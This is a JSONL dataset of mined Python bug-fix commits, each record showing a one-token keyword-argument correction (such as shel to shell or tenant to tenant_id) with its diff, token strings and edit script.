{"project": "boto", "commit_sha": "5f435deb450a148c6a4abe882360e15053ad5dd3", "parent_sha": "b9d9220182b76219a4d538f79e1a8ddcd6ec12be", "file_path": "boto/ec2/address.py", "project_url": "https://github.com/lightpriest/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class Address(EC2Object):\n         if self.allocation_id:\n             return self.connection.release_address(\n-                association_id=self.allocation_id,\n+                allocation_id=self.allocation_id,\n                 dry_run=dry_run)\n         else:\n             return self.connection.release_address(\n", "before": "return self . connection . release_address ( association_id = self . allocation_id , dry_run = dry_run )", "after": "return self . connection . release_address ( allocation_id = self . allocation_id , dry_run = dry_run )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:association_id\", 2, 17, 2, 31], \"allocation_id\"]]"}
{"project": "buildbot", "commit_sha": "90dfd4763c924b5ecfd60b82d39f4eb274aa339a", "parent_sha": "267a1783e039d4d2a460f0597932a36e9ae174ae", "file_path": "buildbot/status/web/builder.py", "project_url": "https://github.com/sigma-star/buildbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class StatusResourceBuilder(HtmlResource, OneLineMixin):\n         data += \"<h2>Recent Builds:</h2>\\n\"\n         data += \"<ul>\\n\"\n         numbuilds = req.args.get('numbuilds', ['5'])[0]\n-        for i,build in enumerate(b.generateFinishedBuilds(numbuilds=int(numbuilds))):\n+        for i,build in enumerate(b.generateFinishedBuilds(num_builds=int(numbuilds))):\n             data += \" <li>\" + self.make_line(req, build, False) + \"</li>\\n\"\n             if i == 0:\n                 data += \"<br />\\n\" # separator\n", "before": "for i , build in enumerate ( b . generateFinishedBuilds ( numbuilds = int ( numbuilds ) ) ) : data += \" <li>\" + self . make_line ( req , build , False ) + \"</li>\\n\" if i == 0 : data += \"<br />\\n\"", "after": "for i , build in enumerate ( b . generateFinishedBuilds ( num_builds = int ( numbuilds ) ) ) : data += \" <li>\" + self . make_line ( req , build , False ) + \"</li>\\n\" if i == 0 : data += \"<br />\\n\"", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:numbuilds\", 3, 59, 3, 68], \"num_builds\"]]"}
{"project": "matplotlib", "commit_sha": "87ef1200be8385e26b86addb6327f576d8f66337", "parent_sha": "0a909f9c9ae931c0316bb4ee3b634076f8992c95", "file_path": "lib/matplotlib/tests/test_axes.py", "project_url": "https://github.com/huayijing/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -963,6 +963,6 @@ def test_eb_line_zorder():\n     ax.errorbar(x, y, yerr=yerr, zorder=5, lw=5, color='r')\n     for j in range(10):\n         ax.axhline(j, lw=5, color='k', zorder=j)\n-        ax.axhline(-j, lw=5, color='k', qzorder=j)\n+        ax.axhline(-j, lw=5, color='k', zorder=j)\n \n     ax.set_title(\"errorbar zorder test\")\n", "before": "ax . axhline ( - j , lw = 5 , color = 'k' , qzorder = j )", "after": "ax . axhline ( - j , lw = 5 , color = 'k' , zorder = j )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:qzorder\", 3, 41, 3, 48], \"zorder\"]]"}
{"project": "biopython", "commit_sha": "6a93cb64e0211a9e061019220f96030871832f9e", "parent_sha": "fd99b976d5775e35cd251a781fb601ffb6906014", "file_path": "Bio/Emboss/Applications.py", "project_url": "https://github.com/paulhendricks/biopython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1276,7 +1276,7 @@ class IepCommandline(_EmbossCommandLine):\n          _Option([\"-sequence\",\"sequence\"],\n                 \"Protein sequence(s) filename\",\n                  filename=True,\n-                 is_require=True),\n+                 is_required=True),\n          _Option([\"-amino\",\"amino\"],\n                  \"Amino acid\"),\n          _Option([\"-lysinemodified\",\"lysinemodified\"],\n", "before": "_Option ( [ \"-sequence\" , \"sequence\" ] , \"Protein sequence(s) filename\" , filename = True , is_require = True ) ,", "after": "_Option ( [ \"-sequence\" , \"sequence\" ] , \"Protein sequence(s) filename\" , filename = True , is_required = True ) ,", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:is_require\", 3, 18, 3, 28], \"is_required\"]]"}
{"project": "grammarVAE", "commit_sha": "2054824f7e5332fc6d716a5c67630cdbb91a0b9d", "parent_sha": "45aee66653f6f0437a038cf580b54db1a211c8a6", "file_path": "models/model_zinc.py", "project_url": "https://github.com/JulianNaumann/grammarVAE", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ class MoleculeVAE():\n         def sampling(args):\n             z_mean_, z_log_var_ = args\n             batch_size = K.shape(z_mean_)[0]\n-            epsilon = K.random_normal(shape=(batch_size, latent_rep_size), mean=0., std = epsilon_std)\n+            epsilon = K.random_normal(shape=(batch_size, latent_rep_size), mean=0., stddev = epsilon_std)\n             return z_mean_ + K.exp(z_log_var_ / 2) * epsilon\n \n         z_mean = Dense(latent_rep_size, name='z_mean', activation = 'linear')(h)\n", "before": "epsilon = K . random_normal ( shape = ( batch_size , latent_rep_size ) , mean = 0. , std = epsilon_std )", "after": "epsilon = K . random_normal ( shape = ( batch_size , latent_rep_size ) , mean = 0. , stddev = epsilon_std )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:std\", 3, 85, 3, 88], \"stddev\"]]"}
{"project": "cinder", "commit_sha": "330a476f8a82c672d636d7da78b81cc46db1e9dd", "parent_sha": "37eb101b1c91c2219d83b78df28d39dc71f7323b", "file_path": "cinder/wsgi.py", "project_url": "https://github.com/Hopebaytech/cinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -296,7 +296,7 @@ class Application(object):\n           res = 'message\\n'\n \n           # Option 2: a nicely formatted HTTP exception page\n-          res = exc.HTTPForbidden(detail='Nice try')\n+          res = exc.HTTPForbidden(explanation='Nice try')\n \n           # Option 3: a webob Response object (in case you need to play with\n           # headers, or you want to be treated like an iterable, or or or)\n", "before": "res = exc . HTTPForbidden ( detail = 'Nice try' )", "after": "res = exc . HTTPForbidden ( explanation = 'Nice try' )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:detail\", 3, 35, 3, 41], \"explanation\"]]"}
{"project": "GASpy_feedback", "commit_sha": "e5b6e112a8de5fce60a4f1cda596717c9c65ee1a", "parent_sha": "88242afffbbd48b04f042f9ec8eab288d4da4f10", "file_path": "feedback.py", "project_url": "https://github.com/ulissigroup/GASpy_feedback", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class CoordcountAdsToEnergy(luigi.WrapperTask):\n         for ads in ADS:\n             gas_predict = GASPredict(adsorbate=ads,\n                                      pkl=self.model_location,\n-                                     calc_setting=self.xc)\n+                                     calc_settings=self.xc)\n             parameters_list = gas_predict.energy_fr_coordcount_ads(max_predictions=self.max_pred)\n             for parameters in parameters_list:\n                 yield FingerprintRelaxedAdslab(parameters=parameters)\n", "before": "gas_predict = GASPredict ( adsorbate = ads , pkl = self . model_location , calc_setting = self . xc )", "after": "gas_predict = GASPredict ( adsorbate = ads , pkl = self . model_location , calc_settings = self . xc )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:calc_setting\", 3, 38, 3, 50], \"calc_settings\"]]"}
{"project": "SleekXMPP", "commit_sha": "6997b2fbf87a080a12334b348653ed4cb30f9218", "parent_sha": "b81ab979006956134e5d924640936fe8cc20dbf3", "file_path": "sleekxmpp/xmlstream/xmlstream.py", "project_url": "https://github.com/LTD-Beget/SleekXMPP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -323,7 +323,7 @@ class XMLStream(object):\n \n             ssl_socket = ssl.wrap_socket(self.socket,\n                                          ca_certs=self.ca_certs,\n-                                         certs_reqs=cert_policy)\n+                                         cert_reqs=cert_policy)\n \n             if hasattr(self.socket, 'socket'):\n                 # We are using a testing socket, so preserve the top\n", "before": "ssl_socket = ssl . wrap_socket ( self . socket , ca_certs = self . ca_certs , certs_reqs = cert_policy )", "after": "ssl_socket = ssl . wrap_socket ( self . socket , ca_certs = self . ca_certs , cert_reqs = cert_policy )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:certs_reqs\", 3, 42, 3, 52], \"cert_reqs\"]]"}
{"project": "pretix", "commit_sha": "4f368a466163d35da859b54317c27737dfc08a13", "parent_sha": "072856a7cc5b8102404db6c476557cc634b996cd", "file_path": "src/tixlcontrol/views/forms.py", "project_url": "https://github.com/maniacs-satm/pretix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -320,7 +320,7 @@ class VariationsField(forms.ModelMultipleChoiceField):\n                             var.values.add(\n                                 PropertyValue.objects.get(\n                                     pk=value,\n-                                    prop_pk=prop\n+                                    prop_id=prop\n                                 )\n                             )\n                         except PropertyValue.DoesNotExist:\n", "before": "var . values . add ( PropertyValue . objects . get ( pk = value , prop_pk = prop ) )", "after": "var . values . add ( PropertyValue . objects . get ( pk = value , prop_id = prop ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:prop_pk\", 3, 37, 3, 44], \"prop_id\"]]"}
{"project": "pretix", "commit_sha": "5c0f04fc67a80870e8a02f93ca89a60b71aa251f", "parent_sha": "122221c2181b0bbfb8c0146edc6ac85d8c5036f9", "file_path": "src/pretix/control/views/vouchers.py", "project_url": "https://github.com/maniacs-satm/pretix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class VoucherList(EventPermissionRequiredMixin, ListView):\n             qs = qs.filter(Q(code__icontains=s) | Q(tag__icontains=s) | Q(comment__icontains=s))\n         if self.request.GET.get(\"tag\", \"\") != \"\":\n             s = self.request.GET.get(\"tag\", \"\")\n-            qs = qs.filter(tag=s)\n+            qs = qs.filter(tag__icontains=s)\n         if self.request.GET.get(\"status\", \"\") != \"\":\n             s = self.request.GET.get(\"status\", \"\")\n             if s == 'v':\n", "before": "qs = qs . filter ( tag = s )", "after": "qs = qs . filter ( tag__icontains = s )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:tag\", 3, 28, 3, 31], \"tag__icontains\"]]"}
{"project": "xDCIShare", "commit_sha": "5da59174363eacc49a08587a93701242c833cfd9", "parent_sha": "86994b767f62f78695fee31fd3cc041efa2183c5", "file_path": "hs_modelinstance/forms.py", "project_url": "https://github.com/RENCI/xDCIShare", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class ExecutedByForm(ModelForm):\n         self.helper = ExecutedByFormHelper(allow_edit, res_short_id, element_id, element_name='ExecutedBy')\n \n         # get all model program resources\n-        mp_resource = users.get_resource_list(types=['ModelProgramResource'])\n+        mp_resource = users.get_resource_list(type=['ModelProgramResource'])\n \n         # set model programs resources in choice list\n         CHOICES = (('Unknown', 'Unknown'),) + tuple((r.short_id, r.title) for r in mp_resource.values()[0])\n", "before": "mp_resource = users . get_resource_list ( types = [ 'ModelProgramResource' ] )", "after": "mp_resource = users . get_resource_list ( type = [ 'ModelProgramResource' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:types\", 3, 47, 3, 52], \"type\"]]"}
{"project": "xDCIShare", "commit_sha": "fc179e7c1469b84e60f3db78318d2b192bcb15d4", "parent_sha": "e7a5cc32ca3821256c5437d1fb3c51ea7d56a9c1", "file_path": "hs_modelinstance/forms.py", "project_url": "https://github.com/RENCI/xDCIShare", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class ExecutedByForm(ModelForm):\n         self.helper = ExecutedByFormHelper(allow_edit, res_short_id, element_id, element_name='ExecutedBy')\n \n         # get all model program resources\n-        mp_resource = users.get_resource_list(types=['ModelProgramResource'])\n+        mp_resource = users.get_resource_list(type=['ModelProgramResource'])\n \n         # set model programs resources in choice list\n         CHOICES = (('Unknown', 'Unknown'),) + tuple((r.short_id, r.title) for r in mp_resource.values()[0])\n", "before": "mp_resource = users . get_resource_list ( types = [ 'ModelProgramResource' ] )", "after": "mp_resource = users . get_resource_list ( type = [ 'ModelProgramResource' ] )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:types\", 3, 47, 3, 52], \"type\"]]"}
{"project": "xDCIShare", "commit_sha": "3c0029d2b3d76991a8a18c4677c0d09c05bc4885", "parent_sha": "fe137816c272457cb8eeed0b59737ec2d4ec182c", "file_path": "hs_core/models.py", "project_url": "https://github.com/RENCI/xDCIShare", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1136,7 +1136,7 @@ class AbstractResource(ResourcePermissionsMixin):\n \n         # delete related resource labelling records\n         res_labels = self.rlabels\n-        UserResourceLabels.objects.filter(resource=res_labels).delete()\n+        UserResourceLabels.objects.filter(rlabels=res_labels).delete()\n         res_labels.delete()\n \n         super(AbstractResource, self).delete()\n", "before": "UserResourceLabels . objects . filter ( resource = res_labels ) . delete ( )", "after": "UserResourceLabels . objects . filter ( rlabels = res_labels ) . delete ( )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:resource\", 3, 43, 3, 51], \"rlabels\"]]"}
{"project": "lutris", "commit_sha": "3b3ad246e150f53501133c80a736726ac33ae61d", "parent_sha": "da5b126b33649b04bff846e0867aa07e8d1615ad", "file_path": "lutris/runners/wine.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -628,7 +628,7 @@ class wine(Runner):\n         wineexec(\"regedit\", wine_path=self.get_executable(), prefix=self.prefix_path)\n \n     def run_winetricks(self, *args):\n-        winetricks('', prefix=self.prefix_path, winetricks_wine=self.get_executable())\n+        winetricks('', prefix=self.prefix_path, wine_path=self.get_executable())\n \n     def run_joycpl(self, *args):\n         joycpl(prefix=self.prefix_path, wine_path=self.get_executable())\n", "before": "winetricks ( '' , prefix = self . prefix_path , winetricks_wine = self . get_executable ( ) )", "after": "winetricks ( '' , prefix = self . prefix_path , wine_path = self . get_executable ( ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:winetricks_wine\", 3, 49, 3, 64], \"wine_path\"]]"}
{"project": "lutris", "commit_sha": "efdc7984407cb5643618b548abc9ca1cc2cbd74e", "parent_sha": "5c4939c7b0fdb02a119865318c9f18a864044404", "file_path": "lutris/gui/config_boxes.py", "project_url": "https://github.com/MCOfficer/lutris", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -327,7 +327,7 @@ class ConfigBox(VBox):\n         directory_chooser = FileChooserEntry(\n             title='Select folder',\n             action=Gtk.FileChooserAction.SELECT_FOLDER,\n-            default=reverse_expanduser(value)\n+            default_path=reverse_expanduser(value)\n         )\n         directory_chooser.entry.connect('changed', self.on_chooser_dir_set,\n                                         option_name)\n", "before": "directory_chooser = FileChooserEntry ( title = 'Select folder' , action = Gtk . FileChooserAction . SELECT_FOLDER , default = reverse_expanduser ( value ) )", "after": "directory_chooser = FileChooserEntry ( title = 'Select folder' , action = Gtk . FileChooserAction . SELECT_FOLDER , default_path = reverse_expanduser ( value ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:default\", 3, 13, 3, 20], \"default_path\"]]"}
{"project": "titletoimagebot", "commit_sha": "782bbee8bf8b7f25ea8710a1474533d5f38a81d9", "parent_sha": "e9e242fb7c58bf32e7062ac425d8e2b4b2eb9ee2", "file_path": "bot.py", "project_url": "https://github.com/CalicoCatalyst/titletoimagebot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -110,7 +110,7 @@ class TitleToImageBot(object):\n     \r\n     def responded_already_reply(self, source_comment, comment, submission):\r\n         com_url = messages.comment_url.format(postid=submission.id, commentid=comment.id)\r\n-        reply = messages.already_responded_message.format(comment_url=com_url)\r\n+        reply = messages.already_responded_message.format(commentlink=com_url)\r\n         \r\n         source_comment.reply(reply)\r\n         \r\n", "before": "reply = messages . already_responded_message . format ( comment_url = com_url )", "after": "reply = messages . already_responded_message . format ( commentlink = com_url )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:comment_url\", 3, 59, 3, 70], \"commentlink\"]]"}
{"project": "DendroPy", "commit_sha": "d1392bef3f3a1266201953422b16982698c22722", "parent_sha": "ade72224b4f13d452bc4425220a0838338bb48cf", "file_path": "dendropy/test/test_dataobject_tree.py", "project_url": "https://github.com/Zsailer/DendroPy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class TreeCreateTest(datatest.AnnotatedDataObjectVerificationTestCase):\n         self.assertDistinctButEqual(self.tree1, tree2, distinct_taxa=False, equal_oids=False)\n \n     def testTreeFromFileMixedPosAndKeywordArgs(self):\n-        self.assertRaises(error.MultipleInitializationSourceError, dendropy.Tree, self.tree1, tream=StringIO(self.tree1_newick_str), schema=\"newick\")\n+        self.assertRaises(error.MultipleInitializationSourceError, dendropy.Tree, self.tree1, stream=StringIO(self.tree1_newick_str), schema=\"newick\")\n \n     def testTreeFromTreeWithExtraKeywordArgsOK(self):\n         tree2 = dendropy.Tree(self.tree1, stream=None, schema=None)\n", "before": "self . assertRaises ( error . MultipleInitializationSourceError , dendropy . Tree , self . tree1 , tream = StringIO ( self . tree1_newick_str ) , schema = \"newick\" )", "after": "self . assertRaises ( error . MultipleInitializationSourceError , dendropy . Tree , self . tree1 , stream = StringIO ( self . tree1_newick_str ) , schema = \"newick\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:tream\", 3, 95, 3, 100], \"stream\"]]"}
{"project": "b2share", "commit_sha": "2ec46e7fa5527689b67ee06362a2d8cc41ca6bc5", "parent_sha": "bd18a92ceeac9944479e63400830f82b2714ee38", "file_path": "modules/webalert/lib/webalert.py", "project_url": "https://github.com/nharraud/b2share", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ def perform_input_alert(action, id_query, alert_name, frequency, notification, i\n         urlargs = \"UNKNOWN\"\n     baskets = create_personal_baskets_selection_box(uid=uid,\n                                                     html_select_box_name='idb',\n-                                                    selected_bsk_id=old_id_basket,\n+                                                    selected_bskid=old_id_basket,\n                                                     ln=cdslang)\n     return webalert_templates.tmpl_input_alert(\n              ln = ln,\n", "before": "baskets = create_personal_baskets_selection_box ( uid = uid , html_select_box_name = 'idb' , selected_bsk_id = old_id_basket , ln = cdslang )", "after": "baskets = create_personal_baskets_selection_box ( uid = uid , html_select_box_name = 'idb' , selected_bskid = old_id_basket , ln = cdslang )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:selected_bsk_id\", 3, 53, 3, 68], \"selected_bskid\"]]"}
{"project": "dask", "commit_sha": "2a924ad8d8282addc8325add7d2fc1b8619dd654", "parent_sha": "d26ce29735cd113d5635adcd90d9e98f2ee83981", "file_path": "dask/array/tests/test_array_core.py", "project_url": "https://github.com/magonser/dask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1287,7 +1287,7 @@ def test_store_kwargs():\n \n     called[0] = False\n     at = np.zeros(shape=(10, 10))\n-    store([a], [at], get=get_func, return_store=True, foo=\"test kwarg\")\n+    store([a], [at], get=get_func, return_stored=True, foo=\"test kwarg\")\n     assert called[0]\n \n \n", "before": "store ( [ a ] , [ at ] , get = get_func , return_store = True , foo = \"test kwarg\" )", "after": "store ( [ a ] , [ at ] , get = get_func , return_stored = True , foo = \"test kwarg\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:return_store\", 3, 36, 3, 48], \"return_stored\"]]"}
{"project": "dnf", "commit_sha": "6196b9c68760039f0817ebfcf9f818804d919c61", "parent_sha": "00fca2a890b12a50f4a079e1055cc95fc9c6cb73", "file_path": "dnf/cli/commands/repoquery.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -298,7 +298,7 @@ class RepoQueryCommand(commands.Command):\n         orquery = q\n \n         if self.opts.file:\n-            q = q.filter(file=self.opts.file)\n+            q = q.filter(file__glob=self.opts.file)\n         if self.opts.whatprovides:\n             q = q.filter(provides__glob=[self.opts.whatprovides])\n         if self.opts.alldeps or self.opts.exactdeps:\n", "before": "q = q . filter ( file = self . opts . file )", "after": "q = q . filter ( file__glob = self . opts . file )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 26, 3, 30], \"file__glob\"]]"}
{"project": "praw", "commit_sha": "e36bdc03ce9a3a78ab562b58df9785c58d8329aa", "parent_sha": "f860e7e5f497ea371157273fef97c474ced03e45", "file_path": "praw/tests/__init__.py", "project_url": "https://github.com/shantnu/praw", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -336,7 +336,7 @@ class BasicTest(unittest.TestCase, BasicHelper):\n     @reddit_only\n     def test_search_with_time_window(self):\n         submissions = len(list(self.r.search('test', subreddit=self.sr,\n-                                             time='week', limit=1000)))\n+                                             period='week', limit=1000)))\n         self.assertTrue(submissions > 0)\n         self.assertTrue(submissions < 1000)\n \n", "before": "submissions = len ( list ( self . r . search ( 'test' , subreddit = self . sr , time = 'week' , limit = 1000 ) ) )", "after": "submissions = len ( list ( self . r . search ( 'test' , subreddit = self . sr , period = 'week' , limit = 1000 ) ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:time\", 3, 46, 3, 50], \"period\"]]"}
{"project": "hera_sim", "commit_sha": "3c71d98fbe77d9d7560acaac9578ce87fb46c1b2", "parent_sha": "8ddccc670ac28240e85295ba75a17a9cb258c260", "file_path": "hera_sim/tests/test_simulator.py", "project_url": "https://github.com/HERA-Team/hera_sim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ def test_consistent_across_reds():\n     defaults.set(\"h1c\")\n \n     # add something that should be the same across a redundant group\n-    sim.add(\"diffuse_foreground\", seed_mode=\"redundant\")\n+    sim.add(\"diffuse_foreground\", seed=\"redundant\")\n \n     # deactivate defaults for good measure\n     defaults.deactivate()\n", "before": "sim . add ( \"diffuse_foreground\" , seed_mode = \"redundant\" )", "after": "sim . add ( \"diffuse_foreground\" , seed = \"redundant\" )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:seed_mode\", 3, 35, 3, 44], \"seed\"]]"}
{"project": "libpebble2", "commit_sha": "29f1ed1404a3f943cecdb2a0b47fbfa00163247a", "parent_sha": "a62ad280d6a1ceb04d2c5cd228cdab610ff2331b", "file_path": "libpebble2/services/appmessage.py", "project_url": "https://github.com/ARLM-Attic/libpebble2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ class AppMessageService(EventSourceMixin):\n                 else:\n                     result[t.key] = struct.unpack(self._type_mapping[(t.type, t.length)], t.data)\n             self._broadcast_event(\"appmessage\", packet.transaction_id, message.uuid, result)\n-            self._pebble.send_packet(AppMessage(transaction_id=packet.transaction_id, message=AppMessageACK()))\n+            self._pebble.send_packet(AppMessage(transaction_id=packet.transaction_id, data=AppMessageACK()))\n         else:\n             if packet.transaction_id in self._pending_messages:\n                 uuid = self._pending_messages[packet.transaction_id]\n", "before": "self . _pebble . send_packet ( AppMessage ( transaction_id = packet . transaction_id , message = AppMessageACK ( ) ) )", "after": "self . _pebble . send_packet ( AppMessage ( transaction_id = packet . transaction_id , data = AppMessageACK ( ) ) )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:message\", 3, 87, 3, 94], \"data\"]]"}
{"project": "DICE-Monitoring", "commit_sha": "fd10c54e1984fe9ef2470b87724062cf749266ef", "parent_sha": "3d50d354ed59983efe05c8dc4347159ff124265f", "file_path": "dmon-logstash/pyLogstash.py", "project_url": "https://github.com/xlab-si/DICE-Monitoring", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class pyLogstashInstance():\n                 return response\n \n             try:\n-                p1 = subprocess.Popen('tar xf logstash-2.2.1.tar.gz', shel=True)\n+                p1 = subprocess.Popen('tar xf logstash-2.2.1.tar.gz', shell=True)\n                 p1.wait()\n             except Exception as inst:\n                 print >> sys.stderr, \"Error extracting logstash!\"\n", "before": "p1 = subprocess . Popen ( 'tar xf logstash-2.2.1.tar.gz' , shel = True )", "after": "p1 = subprocess . Popen ( 'tar xf logstash-2.2.1.tar.gz' , shell = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:shel\", 3, 71, 3, 75], \"shell\"]]"}
{"project": "DICE-Monitoring", "commit_sha": "a7b395eae9793faaed6e3cd8a8e49a750dc21437", "parent_sha": "fd10c54e1984fe9ef2470b87724062cf749266ef", "file_path": "dmon-logstash/pyLogstash.py", "project_url": "https://github.com/xlab-si/DICE-Monitoring", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ class pyLogstashInstance():\n             print >> sys.stderr, \"Logstash already installed!\"\n         else:\n             try:\n-                p = subprocess.Popen('wget https://download.elastic.co/logstash/logstash/logstash-2.2.1.tar.gz', shel=True)\n+                p = subprocess.Popen('wget https://download.elastic.co/logstash/logstash/logstash-2.2.1.tar.gz', shell=True)\n                 p.wait()\n             except Exception as inst:\n                 print >> sys.stderr, \"Error fetching logstash!\"\n", "before": "else : try : p = subprocess . Popen ( 'wget https://download.elastic.co/logstash/logstash/logstash-2.2.1.tar.gz' , shel = True )", "after": "else : try : p = subprocess . Popen ( 'wget https://download.elastic.co/logstash/logstash/logstash-2.2.1.tar.gz' , shell = True )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:shel\", 3, 114, 3, 118], \"shell\"]]"}
{"project": "MMM", "commit_sha": "25452392cd3ec6e5a49b72c832d816aedcd93799", "parent_sha": "44a9245ad6ae77586af419e3b5563907f0cdc0ab", "file_path": "mmm/mmm/mmm_app/views.py", "project_url": "https://github.com/lucaluo/MMM", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def landing(request):\n     for category_top in category_top_list:\n         category = {}\n         category['category_top'] = category_top\n-        category['category_sub_list'] = Category_sub.objects.filter(top=category_top)\n+        category['category_sub_list'] = Category_sub.objects.filter(category_top=category_top)\n         category_list.append(category)\n \n     # category_sub = Category_sub.objects.all().order_by('name')\n", "before": "category [ 'category_sub_list' ] = Category_sub . objects . filter ( top = category_top )", "after": "category [ 'category_sub_list' ] = Category_sub . objects . filter ( category_top = category_top )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:top\", 3, 69, 3, 72], \"category_top\"]]"}
{"project": "mwbase", "commit_sha": "c06ef96bb24f75350b51a121903018e39853eeec", "parent_sha": "b28cc9347c79f7bcd296cde878261f133cf4b885", "file_path": "backend/models.py", "project_url": "https://github.com/uw-ictd/mwbase", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ class AutomatedMessageQuerySet(utils.BaseQuerySet):\n         # Force condition to normal and try again\n         if not hiv and condition != \"normal\":\n             try:\n-                return message_offset.get(conditon=\"normal\",group=group,hiv_messaging=False)\n+                return message_offset.get(condition=\"normal\",group=group,hiv_messaging=False)\n             except AutomatedMessage.DoesNotExist as e:\n                 pass\n \n", "before": "return message_offset . get ( conditon = \"normal\" , group = group , hiv_messaging = False )", "after": "return message_offset . get ( condition = \"normal\" , group = group , hiv_messaging = False )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:conditon\", 3, 43, 3, 51], \"condition\"]]"}
{"project": "azure-sdk-for-python", "commit_sha": "9e8a272b5b48d354b941e32fe301032a830b7f6a", "parent_sha": "4d52b67bcba2e5e081ac14979e096cdccf62e980", "file_path": "tools/azure-sdk-tools/devtools_testutils/azure_testcase.py", "project_url": "https://github.com/test-repo-tih/azure-sdk-for-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class AzureTestCase(ReplayableTest):\n                 # Create azure-identity class\n                 from azure.identity import ClientSecretCredential\n                 credentials = ClientSecretCredential(\n-                    tenant=tenant_id,\n+                    tenant_id=tenant_id,\n                     client_id=client_id,\n                     client_secret=secret\n                 )\n", "before": "credentials = ClientSecretCredential ( tenant = tenant_id , client_id = client_id , client_secret = secret )", "after": "credentials = ClientSecretCredential ( tenant_id = tenant_id , client_id = client_id , client_secret = secret )", "sstub_pattern": "CHANGE_KEYWORD_ARGUMENT_USED", "edit_script": "[[\"Update\", [\"identifier:tenant\", 3, 21, 3, 27], \"tenant_id\"]]"}
